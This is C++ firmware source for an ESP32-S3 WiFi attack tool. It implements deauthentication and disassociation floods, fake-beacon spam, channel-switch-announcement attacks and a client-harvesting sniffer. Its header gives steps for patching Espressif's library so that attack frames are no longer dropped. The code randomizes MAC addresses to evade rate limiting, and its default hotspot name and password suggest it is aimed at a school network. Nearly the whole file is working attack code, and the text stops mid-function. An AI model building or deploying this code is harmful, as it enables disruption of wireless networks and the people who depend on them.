/*
 ==================================================
  ArsWebUI v2.8 — ESP32-S3 N16R8

  WHAT'S NEW IN v2.8:
    - PSRAM target buffer (up to 256 APs stored in OPI PSRAM)
    - Multi-channel deauth ALL: hops ch1-13, briefly stops AP
      per channel to physically reach targets off AP_CHANNEL
    - Inter-burst delay now scales with intensity — AP control
      UI stays alive at HIGH/MAX (was crashing at high load)
    - More aggressive deauth: auth-flood + null-data frames
      alongside deauth/disassoc to exhaust AP client tables
    - WiFi event handlers for automatic STA reconnect
    - Web UI: auto-reconnect JS so control panel recovers
      after brief AP flicker during channel hop sweeps
    - LED + AP startup hardened further

  CHANNEL HOP WARNING:
    The ESP32-S3 has a single radio shared by AP and STA.
    While an AP is running, the radio is physically pinned
    to AP_CHANNEL. To deauth on other channels, the AP must
    briefly stop (~300ms per channel). During a multi-channel
    sweep your control connection WILL flicker. The web UI
    auto-reconnects. This is a hardware limit, not a bug.

  CRITICAL PREREQUISITE — ONE-TIME LIBRARY PATCH:
    esp_wifi_80211_tx() on S3 IDF 4.4+ silently drops deauth
    (0xC0) and disassoc (0xA0) frames via ieee80211_raw_frame_
    sanity_check() inside libnet80211.a.  Weaken that symbol
    so the stub below overrides it at link time:

    Linux/macOS (run once, replace VERSION):
      LIB=~/.arduino15/packages/esp32/hardware/esp32/VERSION/tools/sdk/esp32s3/lib/libnet80211.a
      OBJ=~/.arduino15/packages/esp32/tools/xtensa-esp32s3-elf-gcc/TOOLCHAIN/bin/xtensa-esp32s3-elf-objcopy
      $OBJ --weaken-symbol=ieee80211_raw_frame_sanity_check $LIB $LIB

    Windows (Git Bash, replace paths):
      objcopy --weaken-symbol=ieee80211_raw_frame_sanity_check libnet80211.a libnet80211.a

    The stub (already in this file) overrides the weakened symbol
    so ALL frame types are accepted by esp_wifi_80211_tx().
    Without this patch, zero deauth/disassoc frames ever leave
    the radio regardless of any other fix.

  FIXES IN v2.7:
    - ieee80211_raw_frame_sanity_check stub (frame type unblock)
    - Removed esp_wifi_internal_tx — data-frame API, wrong for mgmt
    - en_sys_seq=true in ALL esp_wifi_80211_tx calls (was false)
    - set_channel skipped when target ch == AP channel (AP owns radio
      in APSTA mode; set_channel to own channel returns fail)
    - pausePromiscForTX spinwait: probe skipped when on AP channel
    - Cross-channel note: in APSTA mode the AP pins the radio to
      AP_CHANNEL. Targets on other channels won't be deauthed until
      the AP stops. deauth_all pauses promisc + skips cross-ch targets
      to avoid stalling.

  UPGRADES in 2.2-2.6 retained (see git history)

  FLASH SETTINGS (Arduino IDE):
    Board            : ESP32S3 Dev Module
    Flash Size       : 16MB (128Mb)
    Partition Scheme : Huge APP (3MB No OTA/1MB SPIFFS)
    PSRAM            : OPI PSRAM (optional — code does not require it)
    USB Mode         : Hardware CDC and JTAG
    USB CDC On Boot  : Disabled           ← CRITICAL
    CPU Frequency    : 240MHz
    Upload Speed     : 921600
    Core Debug Level : None

  REQUIRED LIBRARIES:
    - ESPAsyncWebServer (me-no-dev or mathieucarbou / ESP32Async)
    - AsyncTCP
    - Adafruit NeoPixel

  NEOPIXEL (GPIO48 — built-in on most S3 DevKits):
    Blue   = Booting
    Green  = Ready / idle
    Purple = Attack active (gentle pulse)
    Red    = Fatal error

  SERIAL:
    UART0 GPIO43 TX / GPIO44 RX @ 115200
    USB CDC On Boot = Disabled
 ==================================================
*/

// ── LED STATE ENUM — must live ABOVE all #includes ────────────────────────────
// ArduinoDroid's auto-prototyper inserts generated prototypes after the last
// #include. If setLedState(LedState s) is forward-declared there and LedState
// isn't yet defined, the build fails with "not declared in this scope".
// Placing the enum and its volatile instance here — before every #include —
// guarantees the type is visible at the prototype-insertion point.
enum LedState { LS_OFF, LS_BLUE, LS_GREEN, LS_RED, LS_PURPLE, LS_YELLOW };
volatile LedState ledState = LS_OFF;

#include <Arduino.h>
#include <WiFi.h>
#include <WiFiUdp.h>
#include <AsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <nvs_flash.h>
#include <Preferences.h>
#include <Adafruit_NeoPixel.h>
#include "web_content.h"

// ── FRAME SANITY OVERRIDE ─────────────────────────────────────────────────────
// Espressif's libnet80211.a contains ieee80211_raw_frame_sanity_check() which
// silently rejects deauth (0xC0) and disassoc (0xA0) frames before they reach
// the radio.  After weakening the symbol in libnet80211.a with objcopy (see
// header), this stub wins at link time and allows ALL frame types through.
// WITHOUT the objcopy step, this stub has no effect — the strong symbol in
// the library still wins.
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg,
                                                  int32_t arg2,
                                                  int32_t arg3) {
  return 0;  // 0 = pass; any non-zero = drop
}

// ─── NEOPIXEL ────────────────────────────────────────────────────────────────
#define LED_PIN   48
#define LED_COUNT 1
Adafruit_NeoPixel led(LED_COUNT, LED_PIN, NEO_GRB + NEO_KHZ800);

// LED state machine — enum + volatile declared before #includes (see top of file).
// loop() is the ONLY caller of led.show() — prevents concurrent NeoPixel access.
static void setLedState(LedState s) { ledState = s; }

void updateLED() {
  static LedState   last        = LS_OFF;
  static uint32_t   pulseTimer  = 0;
  static bool       pulseBright = true;

  LedState s = ledState;

  if (s == LS_PURPLE) {
    // Gentle pulse: 700ms period, higher visibility
    if (millis() - pulseTimer > 700) {
      pulseTimer  = millis();
      pulseBright = !pulseBright;
      led.setPixelColor(0, pulseBright ? led.Color(28,0,32) : led.Color(8,0,10));
      led.show();
    }
    last = LS_PURPLE;
    return;
  }

  if (s == last) return;
  last = s;

  switch (s) {
    case LS_BLUE:   led.setPixelColor(0, led.Color( 0, 0,40)); break;
    case LS_GREEN:  led.setPixelColor(0, led.Color( 0,40, 0)); break;
    case LS_RED:    led.setPixelColor(0, led.Color(40, 0, 0)); break;
    case LS_YELLOW: led.setPixelColor(0, led.Color(40,28, 0)); break;
    default:        led.setPixelColor(0, led.Color( 0, 0, 0)); break;
  }
  led.show();
}

// ─── SERIAL (UART0 = GPIO43 TX / GPIO44 RX, not USB CDC) ─────────────────────
#define DBG(f,...)  Serial0.printf("[DBG] "  f "\n", ##__VA_ARGS__)
#define INFO(f,...) Serial0.printf("[INFO] " f "\n", ##__VA_ARGS__)
#define ERR(f,...)  Serial0.printf("[ERR] "  f "\n", ##__VA_ARGS__)

// ─── CONFIG ──────────────────────────────────────────────────────────────────
#define AP_SSID_DEFAULT   "KNHS HOTSPOT PRIVATE"
#define AP_PASS_DEFAULT   "knhsattack12"
#define DNS_PORT          53
#define WEB_PORT          80
#define AP_CHANNEL        6
#define MAX_TX_POWER      78        // 19.5 dBm max legal on S3
#define MAX_CLIENTS       64
#define CHANNEL_MAX       13
#define MAX_INPUT_LEN     256
#define SEM_TIMEOUT       pdMS_TO_TICKS(3000)
#define PROMISC_MAX_AGE   45000     // ms before client entry is stale
#define HEAP_MIN          20480     // ~20 KB soft warn; hard stop only under ~12 KB
#define LOG_MAX           64
#define BEACON_SSID_COUNT 20

// Intensity → frames per burst
#define INTENSITY_LOW   8
#define INTENSITY_MED   20
#define INTENSITY_HIGH  40
#define INTENSITY_MAX   80

// ─── PSRAM TARGET BUFFER ─────────────────────────────────────────────────────
// Stores up to 256 AP targets from the last full scan. Allocated from OPI PSRAM
// so it doesn't eat into the ~300KB heap needed for WiFi + AsyncWebServer.
#include <esp_heap_caps.h>

#define MAX_PSRAM_TARGETS 256

struct DeauthTarget {
  uint8_t bssid[6];
  uint8_t ch;
};

static DeauthTarget* psramTargets     = nullptr;
static int           psramTargetCount = 0;
static bool          psramAvailable   = false;

// ─── GLOBALS ─────────────────────────────────────────────────────────────────
AsyncWebServer server(WEB_PORT);
DNSServer      dnsServer;
Preferences    prefs;

volatile bool          deauthRunning = false;
volatile bool          attackRunning = false;
volatile bool          stopRequested = false;
volatile unsigned long packetsSent   = 0;

TaskHandle_t deauthTaskHandle    = NULL;
TaskHandle_t udpTaskHandle       = NULL;
TaskHandle_t deauthAllTaskHandle = NULL;
TaskHandle_t deauthAllChHandle   = NULL;   // multi-channel hop task
TaskHandle_t promiscTaskHandle   = NULL;
TaskHandle_t beaconTaskHandle    = NULL;
TaskHandle_t csaTaskHandle       = NULL;

uint8_t  targetBSSID[6]  = {0};
uint8_t  targetClient[6] = {0};
int      targetChannel   = 0;
String   targetSSID      = "";
uint8_t  ownBSSID[6]     = {0};
uint8_t  ownBSSIDap[6]   = {0};

uint8_t intensity      = INTENSITY_HIGH;
bool    macRandEnabled = true;

struct ClientInfo {
  uint8_t       mac[6];
  int           rssi;
  uint8_t       channel;
  unsigned long lastSeen;
};

ClientInfo clients[MAX_CLIENTS];
int numClients = 0;

volatile bool promiscRunning = false;
volatile bool promiscPaused  = false;

char     client_ssid[64] = "";
char     client_pass[64] = "";
bool     client_connected = false;
String   client_ip        = "";
String   targetIP         = "";
uint16_t targetPort       = 80;

SemaphoreHandle_t attackMutex  = NULL;
SemaphoreHandle_t clientsMutex = NULL;
SemaphoreHandle_t logMutex     = NULL;

String apiKey = "";  // open — UI does not send key

// ─── EVENT LOG ───────────────────────────────────────────────────────────────
struct LogEntry { unsigned long ts; char msg[80]; };
LogEntry logBuf[LOG_MAX];
int logHead  = 0;
int logCount = 0;

void logEvent(const char* fmt, ...) {
  if (!logMutex) return;
  char tmp[80];
  va_list ap; va_start(ap, fmt);
  vsnprintf(tmp, sizeof(tmp), fmt, ap);
  va_end(ap);
  Serial0.printf("[LOG] %s\n", tmp);
  if (xSemaphoreTake(logMutex, pdMS_TO_TICKS(50)) != pdTRUE) return;
  logBuf[logHead].ts = millis();
  strncpy(logBuf[logHead].msg, tmp, 79);
  logBuf[logHead].msg[79] = '\0';
  logHead = (logHead + 1) % LOG_MAX;
  if (logCount < LOG_MAX) logCount++;
  xSemaphoreGive(logMutex);
}

// ─── VALIDATION ──────────────────────────────────────────────────────────────
bool validateChannel(int ch)      { return ch >= 1 && ch <= CHANNEL_MAX; }
bool validatePacketCount(int cnt) { return cnt >= 1 && cnt <= 9999; }
bool validatePort(int port)       { return port >= 1 && port <= 65535; }

bool validateMAC(const String& s) {
  if (s.length() != 17) return false;
  for (int i = 0; i < 17; i++) {
    if (i % 3 == 2) { if (s[i] != ':') return false; }
    else             { if (!isxdigit(s[i])) return false; }
  }
  return true;
}

bool parseMAC(const String& s, uint8_t* mac) {
  if (!validateMAC(s)) return false;
  return sscanf(s.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
    &mac[0],&mac[1],&mac[2],&mac[3],&mac[4],&mac[5]) == 6;
}

bool validateIP(const String& ip) {
  if (ip.length() > 15 || ip.length() < 7) return false;
  int dots = 0;
  for (char c : ip) {
    if (c == '.') { if (++dots > 3) return false; }
    else if (!isdigit(c)) return false;
  }
  return dots == 3;
}

bool isOwnAP(const char* ssid, const char* bssidStr) {
  String apSSID = prefs.getString("ap_ssid", AP_SSID_DEFAULT);
  if (ssid && strlen(ssid) > 0 && strcmp(ssid, apSSID.c_str()) == 0) return true;
  if (bssidStr && strlen(bssidStr) == 17) {
    char own[18];
    snprintf(own, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
      ownBSSIDap[0],ownBSSIDap[1],ownBSSIDap[2],
      ownBSSIDap[3],ownBSSIDap[4],ownBSSIDap[5]);
    if (strcasecmp(bssidStr, own) == 0) return true;
  }
  return false;
}

void incrementPackets(uint32_t n) { packetsSent += n; }

String jsEscape(const String& s) {
  String o; o.reserve(s.length() + 8);
  for (char c : s) {
    if      (c == '\'') o += "\\'";
    else if (c == '\\') o += "\\\\";
    else if (c == '"')  o += "\\\"";
    else if (c == '\r') o += "\\r";
    else if (c == '\n') o += "\\n";
    else                o += c;
  }
  return o;
}

// ─── TX POWER ────────────────────────────────────────────────────────────────
void boostTxPower() {
  // ── Country code: PH unlocks ch1-13 ──────────────────────────────────────
  // Default IDF country "01"/worldwide caps at ch11. ch12/13 TX returns
  // 0x102 (ESP_ERR_WIFI_IF) at the driver level — channel blocked, not interface error.
  // POLICY_MANUAL: ignore any AP country IE, stay on our setting.
  wifi_country_t country;
  memset(&country, 0, sizeof(country));
  country.cc[0] = 'P'; country.cc[1] = 'H'; country.cc[2] = '\0';
  country.schan         = 1;
  country.nchan         = 13;
  country.max_tx_power  = 20;
  country.policy        = WIFI_COUNTRY_POLICY_MANUAL;
  esp_err_t ce = esp_wifi_set_country(&country);
  INFO("Country PH ch1-13: %s (0x%x)", ce == ESP_OK ? "OK" : "FAIL", (unsigned)ce);

  esp_wifi_set_max_tx_power(MAX_TX_POWER);
  esp_wifi_set_ps(WIFI_PS_NONE);
  esp_wifi_set_protocol(WIFI_IF_AP,  WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N);
  esp_wifi_set_protocol(WIFI_IF_STA, WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N);
  INFO("TX power: %d (%.1f dBm) protocols BGN", MAX_TX_POWER, MAX_TX_POWER * 0.25f);
}

// ─── MAC RANDOMIZATION ───────────────────────────────────────────────────────
void randomizeMAC(uint8_t* mac) {
  uint32_t r1 = esp_random(), r2 = esp_random();
  mac[0] = ((r1 >>  0) & 0xFE) | 0x02;  // unicast, locally administered
  mac[1] =  (r1 >>  8) & 0xFF;
  mac[2] =  (r1 >> 16) & 0xFF;
  mac[3] =  (r1 >> 24) & 0xFF;
  mac[4] =  (r2 >>  0) & 0xFF;
  mac[5] =  (r2 >>  8) & 0xFF;
}

// ─── PROMISCUOUS PAUSE/RESUME ────────────────────────────────────────────────
// Detach RX callback before TX bursts to prevent radio path contention.
// The radio stays in promisc mode but stops firing the callback during TX.

// Forward declaration — needed by resumePromiscAfterTX
void IRAM_ATTR promisc_cb(void* buf, wifi_promiscuous_pkt_type_t type);

// pausePromiscForTX: FULL promisc disable, not just callback null.
// On S3 IDF, esp_wifi_set_promiscuous(true) hard-locks the radio to its
// current channel at the driver level.  esp_wifi_set_channel() returns
// ESP_FAIL (0xffffffff) while promisc is true, regardless of country code.
// Nulling the RX callback does NOT release that lock.
void pausePromiscForTX() {
  if (!promiscRunning || promiscPaused) return;
  // Step 1: kill the callback so no new frames fire
  esp_wifi_set_promiscuous_rx_cb(NULL);
  // Step 2: full disable — releases the channel lock in the S3 driver
  esp_wifi_set_promiscuous(false);
  promiscPaused = true;
  // Step 3: fixed settle delay after set_promiscuous(false).
  // The AP controls the radio channel in APSTA mode, so channel-probe
  // polling (the v2.6 spinwait) always fails — the AP refuses to yield.
  // A 5ms delay is sufficient for the promisc lock to release.
  ets_delay_us(5000);
}

void resumePromiscAfterTX() {
  if (!promiscRunning || !promiscPaused) return;
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(promisc_cb);
  promiscPaused = false;
}

// ─── REASON CODE ROTATION ────────────────────────────────────────────────────
static const uint8_t kReasons[] = {1, 2, 3, 4, 6, 7, 8};
static uint8_t reasonIdx = 0;

static inline uint8_t nextReason() {
  uint8_t r = kReasons[reasonIdx];
  reasonIdx = (reasonIdx + 1) % (sizeof(kReasons) / sizeof(kReasons[0]));
  return r;
}

// ─── DEAUTH BURST ────────────────────────────────────────────────────────────
// Fixed vs previous versions:
//   1. pausePromiscForTX() before any TX — kills silent-fail on S3
//   2. en_sys_seq=true — hardware manages sequence numbers
//   3. Both directions: AP→client AND client→AP
//   4. 2ms channel settle (up from 500µs)
//   5. Fallback to WIFI_IF_STA if AP interface rejects frame

static int s_txFailLog = 0;

// sendDeauthBurst — CALLER must have already called pausePromiscForTX()
// before the first burst and resumePromiscAfterTX() after the last.
// Promisc must be fully OFF (not just callback-nulled) for set_channel to work.
//
// tx_frame priority (after ieee80211_raw_frame_sanity_check stub is active):
//   1. esp_wifi_80211_tx AP   — AP interface always up; first choice
//   2. esp_wifi_80211_tx STA  — fallback; may fail if STA not associated
//
// en_sys_seq=true required when AP/WiFi stack is running (IDF 4.4+ rule).
// internal_tx is the lwip data-frame path — wrong API for management frames.
int sendDeauthBurst(const uint8_t* bssid, int ch,
                    const uint8_t* client, int numFrames) {
  if (!validateChannel(ch)) return 0;

  // Channel management in APSTA mode:
  //   The softAP anchors the radio to AP_CHANNEL at the PHY layer.
  //   set_channel() in this mode controls the STA interface config
  //   but the radio does NOT physically hop while the AP is running.
  //   Consequence: targets on AP_CHANNEL are reachable; targets on
  //   other channels are not (single-radio constraint).
  //
  //   When ch == AP_CHANNEL: skip the call — we are already there.
  //   When ch != AP_CHANNEL: attempt once for future mode flexibility,
  //   log, but continue TX on the current channel regardless.
  if (ch != AP_CHANNEL) {
    esp_err_t ce = esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    if (ce != ESP_OK) {
      if (s_txFailLog < 3)
        logEvent("ch%d != AP_CHANNEL(%d) — AP pins radio, TX on ch%d",
                 ch, AP_CHANNEL, AP_CHANNEL);
      s_txFailLog++;
    } else {
      ets_delay_us(4000);  // PHY settle after hop
    }
  }
  // No set_channel needed when ch == AP_CHANNEL; radio is already there.

  // SA: randomize per burst to bypass per-AP deauth rate limiters
  uint8_t sa[6];
  if (macRandEnabled) randomizeMAC(sa);
  else                memcpy(sa, bssid, 6);

  const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
  const uint8_t* da = (client != nullptr) ? client : bcast;

  // ── Direction 1: AP → Client (or broadcast) ──────────────────────────────
  uint8_t deauth1[26]   = {};
  uint8_t disassoc1[26] = {};
  deauth1[0]   = 0xC0; deauth1[1] = 0x00;   // type=mgmt subtype=deauth
  disassoc1[0] = 0xA0; disassoc1[1] = 0x00;  // type=mgmt subtype=disassoc
  deauth1[2]   = disassoc1[2] = 0x3A;
  deauth1[3]   = disassoc1[3] = 0x01;
  memcpy(&deauth1[4],    da,    6);   // DA
  memcpy(&disassoc1[4],  da,    6);
  memcpy(&deauth1[10],   sa,    6);   // SA (randomized)
  memcpy(&disassoc1[10], sa,    6);
  memcpy(&deauth1[16],   bssid, 6);   // BSSID
  memcpy(&disassoc1[16], bssid, 6);

  // ── Direction 2: Client → AP (targeted client only) ──────────────────────
  uint8_t deauth2[26]   = {};
  uint8_t disassoc2[26] = {};
  const bool dir2 = (client != nullptr);
  if (dir2) {
    deauth2[0]   = 0xC0; deauth2[1] = 0x00;
    disassoc2[0] = 0xA0; disassoc2[1] = 0x00;
    deauth2[2]   = disassoc2[2] = 0x3A;
    deauth2[3]   = disassoc2[3] = 0x01;
    memcpy(&deauth2[4],    bssid,  6);   // DA = AP
    memcpy(&disassoc2[4],  bssid,  6);
    memcpy(&deauth2[10],   client, 6);   // SA = spoofed client
    memcpy(&disassoc2[10], client, 6);
    memcpy(&deauth2[16],   bssid,  6);
    memcpy(&disassoc2[16], bssid,  6);
  }

  // tx_frame: esp_wifi_80211_tx only — internal_tx is the lwip data path
  // and rejects management frames (0xC0/0xA0).  en_sys_seq MUST be true
  // whenever the AP/WiFi stack is running (IDF 4.4+ requirement).
  // AP interface tried first since it is guaranteed up; STA is fallback.
  auto tx_frame = [](void* f, uint16_t len) -> bool {
    if (esp_wifi_80211_tx(WIFI_IF_AP,  (const uint8_t*)f, len, true) == ESP_OK) return true;
    if (esp_wifi_80211_tx(WIFI_IF_STA, (const uint8_t*)f, len, true) == ESP_OK) return true;
    return false;
  };

  int sent = 0;
  for (int i = 0; i < numFrames && !stopRequested; i++) {
    const uint8_t r = nextReason();
    deauth1[24] = r; deauth1[25] = 0;
    disassoc1[24] = r; disassoc1[25] = 0;

    if (tx_frame(deauth1,   26)) sent++;
    ets_delay_us(150);
    if (tx_frame(disassoc1, 26)) sent++;
    ets_delay_us(150);

    if (dir2) {
      deauth2[24] = r; deauth2[25] = 0;
      disassoc2[24] = r; disassoc2[25] = 0;
      if (tx_frame(deauth2,   26)) sent++;
      ets_delay_us(150);
      if (tx_frame(disassoc2, 26)) sent++;
      ets_delay_us(150);
    }
  }

  if (sent == 0 && s_txFailLog < 8) {
    logEvent("TX burst zero ch=%d frames=%d (80211_tx failing — lib patch done?)", ch, numFrames);
    s_txFailLog++;
  }

  incrementPackets(sent);
  return sent;
}

// ─── PROMISCUOUS SNIFFER ─────────────────────────────────────────────────────
typedef struct {
  uint16_t frame_ctrl;
  uint16_t duration_id;
  uint8_t  addr1[6];
  uint8_t  addr2[6];
  uint8_t  addr3[6];
  uint16_t seq_ctrl;
  uint8_t  addr4[6];
} __attribute__((packed)) ieee80211_hdr_t;

static const uint8_t kBcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
static const uint8_t kMcast[3] = {0x01,0x00,0x5E};

static inline bool isUnicast(const uint8_t* m) {
  return !(memcmp(m, kBcast, 6) == 0 ||
           memcmp(m, kMcast, 3) == 0 ||
           (m[0] & 0x01));
}

static IRAM_ATTR void addClient(const uint8_t* mac, int rssi, uint8_t ch) {
  if (!clientsMutex || !isUnicast(mac)) return;
  if (xSemaphoreTake(clientsMutex, pdMS_TO_TICKS(10)) != pdTRUE) return;

  for (int i = 0; i < numClients; i++) {
    if (memcmp(clients[i].mac, mac, 6) == 0) {
      clients[i].rssi     = rssi;
      clients[i].channel  = ch;
      clients[i].lastSeen = millis();
      xSemaphoreGive(clientsMutex);
      return;
    }
  }

  if (numClients >= MAX_CLIENTS) {
    // Evict oldest entry
    unsigned long oldest = ULONG_MAX; int oi = 0;
    for (int i = 0; i < numClients; i++) {
      if (clients[i].lastSeen < oldest) { oldest = clients[i].lastSeen; oi = i; }
    }
    clients[oi] = clients[--numClients];
  }

  memcpy(clients[numClients].mac, mac, 6);
  clients[numClients].rssi     = rssi;
  clients[numClients].channel  = ch;
  clients[numClients].lastSeen = millis();
  numClients++;
  xSemaphoreGive(clientsMutex);
}

void IRAM_ATTR promisc_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (promiscPaused) return;
  if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;

  const wifi_promiscuous_pkt_t* pkt = (const wifi_promiscuous_pkt_t*)buf;
  if (pkt->rx_ctrl.sig_len < sizeof(ieee80211_hdr_t)) return;

  const ieee80211_hdr_t* hdr = (const ieee80211_hdr_t*)pkt->payload;
  const uint8_t ftype = (hdr->frame_ctrl >> 2) & 0x03;
  const uint8_t fsub  = (hdr->frame_ctrl >> 4) & 0x0F;
  const int     rssi  = pkt->rx_ctrl.rssi;
  const uint8_t ch    = pkt->rx_ctrl.channel;

  if      (ftype == 2)               addClient(hdr->addr2, rssi, ch);  // data
  else if (ftype == 0 && fsub == 4)  addClient(hdr->addr2, rssi, ch);  // probe req
  else if (ftype == 0 && fsub == 0)  addClient(hdr->addr2, rssi, ch);  // assoc req
  else if (ftype == 0 && fsub == 2)  addClient(hdr->addr2, rssi, ch);  // reassoc req
}

void promisc_task(void* param) {
  INFO("Promisc sniffer up on core %d", xPortGetCoreID());
  while (promiscRunning) {
    vTaskDelay(pdMS_TO_TICKS(8000));
    if (!clientsMutex) continue;
    if (xSemaphoreTake(clientsMutex, pdMS_TO_TICKS(100)) != pdTRUE) continue;
    const unsigned long now = millis();
    for (int i = 0; i < numClients; ) {
      if ((now - clients[i].lastSeen) > PROMISC_MAX_AGE)
        clients[i] = clients[--numClients];
      else i++;
    }
    xSemaphoreGive(clientsMutex);
  }
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_set_promiscuous(false);
  promiscTaskHandle = NULL;
  vTaskDelete(NULL);
}

void startPromiscuous() {
  if (promiscRunning) return;
  esp_wifi_set_promiscuous_rx_cb(promisc_cb);
  esp_wifi_set_promiscuous(true);
  promiscRunning = true;
  promiscPaused  = false;
  xTaskCreatePinnedToCore(promisc_task, "promisc", 3072, NULL, 1,
                          &promiscTaskHandle, 1);
  logEvent("Promisc sniffer started");
}

void stopPromiscuous() {
  if (!promiscRunning) return;
  promiscRunning = false;
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_set_promiscuous(false);
  // Wait briefly for the promisc_task to see promiscRunning=false and self-delete.
  // Clear the handle so callers don't reference a task that has exited.
  delay(20);
  promiscTaskHandle = NULL;
}

// ─── BEACON SPAM ─────────────────────────────────────────────────────────────
static const char* kBeaconSSIDs[BEACON_SSID_COUNT] = {
  "Free WiFi",       "PLDT-HOME-FIBER",  "Globe_Prepaid",  "CONVERGE-FIBER",
  "SKY_Cable",       "TNT_Hotspot",      "Smart_Bro",      "DITO_LTE",
  "Restaurant_WiFi", "Hotel_Guest",      "Airport_Free",   "School_Network",
  "Barangay_WiFi",   "Public_Hotspot",   "Mall_WiFi",      "Coffee_Shop",
  "Open_Network",    "Guest_WiFi",       "TP-LINK_FREE",   "ASUS_Router"
};

static int buildBeaconFrame(uint8_t* f, const uint8_t* bssid,
                             const char* ssid, uint8_t ch) {
  int p = 0;
  f[p++]=0x80; f[p++]=0x00;         // FC: beacon
  f[p++]=0x00; f[p++]=0x00;         // duration
  memset(f+p,0xFF,6); p+=6;         // DA: broadcast
  memcpy(f+p,bssid,6); p+=6;        // SA
  memcpy(f+p,bssid,6); p+=6;        // BSSID
  f[p++]=0x00; f[p++]=0x00;         // seq ctrl
  memset(f+p,0,8); p+=8;            // timestamp
  f[p++]=0x64; f[p++]=0x00;         // interval: 100 TU
  f[p++]=0x31; f[p++]=0x04;         // capability: ESS+Privacy
  uint8_t sl=(uint8_t)strnlen(ssid,32);
  f[p++]=0x00; f[p++]=sl;
  memcpy(f+p,ssid,sl); p+=sl;
  f[p++]=0x01; f[p++]=0x08;         // supported rates IE
  f[p++]=0x82; f[p++]=0x84; f[p++]=0x8B; f[p++]=0x96;
  f[p++]=0x24; f[p++]=0x30; f[p++]=0x48; f[p++]=0x6C;
  f[p++]=0x03; f[p++]=0x01; f[p++]=ch;   // DS parameter set
  return p;
}

void beacon_spam_task(void* param) {
  logEvent("Beacon spam started");
  setLedState(LS_PURPLE);
  pausePromiscForTX();  // hold off for entire beacon attack

  uint8_t fakeBSSID[6];
  uint8_t frame[128];

  while (attackRunning && !stopRequested) {
    for (int i = 0; i < BEACON_SSID_COUNT && !stopRequested; i++) {
      randomizeMAC(fakeBSSID);
      uint8_t ch = (esp_random() % CHANNEL_MAX) + 1;
      int len = buildBeaconFrame(frame, fakeBSSID, kBeaconSSIDs[i], ch);

      // Beacon frames ARE allowed by ieee80211_raw_frame_sanity_check.
      // AP pins radio to AP_CHANNEL in APSTA mode; channel hop skipped.
      // DS parameter IE in the beacon still advertises the random ch.
      // Try both interfaces independently for maximum reach — do NOT
      // short-circuit: even if AP TX succeeds, STA TX may reach additional
      // clients. Count each successful TX separately.
      for (int j = 0; j < 5 && !stopRequested; j++) {
        int txed = 0;
        if (esp_wifi_80211_tx(WIFI_IF_AP,  frame, len, true) == ESP_OK) txed++;
        if (esp_wifi_80211_tx(WIFI_IF_STA, frame, len, true) == ESP_OK) txed++;
        if (txed > 0) incrementPackets(txed);
        ets_delay_us(500);
      }
      vTaskDelay(pdMS_TO_TICKS(10));
    }
    // resumePromiscAfterTX intentionally NOT called here — keep promisc
    // off for the full beacon attack. Restored once after the loop exits.
  }

  resumePromiscAfterTX();
  esp_wifi_set_channel(AP_CHANNEL, WIFI_SECOND_CHAN_NONE);
  logEvent("Beacon spam ended. Total pkts: %lu", packetsSent);

  if (xSemaphoreTake(attackMutex, SEM_TIMEOUT) == pdTRUE) {
    attackRunning = false; stopRequested = false; beaconTaskHandle = NULL;
    xSemaphoreGive(attackMutex);
  }
  setLedState(LS_GREEN);
  vTaskDelete(NULL);
}

// ─── CSA ATTACK ──────────────────────────────────────────────────────────────
static int buildCSAFrame(uint8_t* f, const uint8_t* bssid,
                          const uint8_t* da, uint8_t newCh) {
  int p = 0;
  f[p++]=0xD0; f[p++]=0x00;    // FC: action
  f[p++]=0x3A; f[p++]=0x01;    // duration
  memcpy(f+p,da,   6); p+=6;   // DA
  memcpy(f+p,bssid,6); p+=6;   // SA
  memcpy(f+p,bssid,6); p+=6;   // BSSID
  f[p++]=0x00; f[p++]=0x00;    // seq ctrl
  f[p++]=0x00;                  // category: spectrum mgmt
  f[p++]=0x04;                  // action: CSA
  f[p++]=0x25; f[p++]=0x03;    // CSA IE: id=37, len=3
  f[p++]=0x01;                  // mode: stop TX
  f[p++]=newCh;                 // new channel
  f[p++]=0x01;                  // count: 1 TBTT
  return p;
}

void csa_task(void* param) {
  logEvent("CSA on %02X:%02X:%02X:%02X:%02X:%02X ch%d",
    targetBSSID[0],targetBSSID[1],targetBSSID[2],
    targetBSSID[3],targetBSSID[4],targetBSSID[5], targetChannel);
  setLedState(LS_PURPLE);

  pausePromiscForTX();  // hold off for entire CSA attack

  uint8_t frame[64];
  const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
  uint8_t decoyCh = (targetChannel <= 6) ? 13 : 1;

  while (attackRunning && !stopRequested) {
    int len = buildCSAFrame(frame, targetBSSID, bcast, decoyCh);

    // Action frames (0xD0) are allowed by ieee80211_raw_frame_sanity_check.
    // Transmit on AP_CHANNEL; CSA still reaches clients on that channel.
    for (int i = 0; i < intensity && !stopRequested; i++) {
      if (esp_wifi_80211_tx(WIFI_IF_AP,  frame, len, true) == ESP_OK ||
          esp_wifi_80211_tx(WIFI_IF_STA, frame, len, true) == ESP_OK)
        incrementPackets(1);
      ets_delay_us(500);
    }

    sendDeauthBurst(targetBSSID, targetChannel, nullptr, 6);
    vTaskDelay(pdMS_TO_TICKS(20));
  }
  resumePromiscAfterTX();

  esp_wifi_set_channel(AP_CHANNEL, WIFI_SECOND_CHAN_NONE);
  logEvent("CSA ended. Pkts: %lu", packetsSent);

  if (xSemaphoreTake(attackMutex, SEM_TIMEOUT) == pdTRUE) {
    attackRunning = false; stopRequested = false; csaTaskHandle = NULL;
    xSemaphoreGive(attackMutex);
  }
  setLedState(LS_GREEN);
